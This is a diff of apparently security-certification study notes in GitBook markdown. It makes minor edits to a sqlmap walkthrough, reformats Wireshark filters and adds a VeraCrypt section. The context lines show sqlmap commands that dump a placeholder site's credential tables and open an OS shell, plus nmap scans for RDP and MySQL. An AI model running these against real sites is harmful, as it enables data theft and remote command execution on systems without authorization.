@@ -221,12 +221,12 @@ sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that yo
 5- Select the table you want to dump:  
 sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
 
-6- For OS shell this is the command:   
+6- For the OS shell this is the command:   
 sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
 
 6.1 In the shell type:
 TASKLIST  (to view the tasks)
-6.2 Use systeminfo for windows to get all os version
+6.2 Use systeminfo for windows to get all OS version
 6.3 Use uname -a for linux to get os version
 ```
 {% endcode %}
@@ -244,12 +244,12 @@ TASKLIST  (to view the tasks)
 
 ## Wireshark
 
-```
-tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given
-tcp.flags.syn == 1   (Which machine for dos)
-http.request.method == POST   (for passwords) or click tools ---> credentials
+<pre data-overflow="wrap"><code>tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given
+<strong>
+</strong><strong>tcp.flags.syn == 1   (Which machine for dos)
+</strong>http.request.method == POST   (for passwords) or click tools ---> credentials
 Also
-```
+</code></pre>
 
 ## Find FQDN
 
@@ -276,3 +276,18 @@ the Check RDP enabled after getting ip- nmap -p 3389 -iL ip.txt | grep open (ip.
 Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt contains all the alive hosts from target subnet)
 ```
 {% endcode %}
+
+## Disk Encryption with Veracyrpt
+
+1. Create a new volume using create volume button&#x20;
+
+<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption><p>create volume button</p></figcaption></figure>
+
+2. Create an encrypted file container. This creates a volume like Local Disk C:.&#x20;
+
+<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption><p>encrypted file container option</p></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption><p>select a volme location and name it.</p></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
+
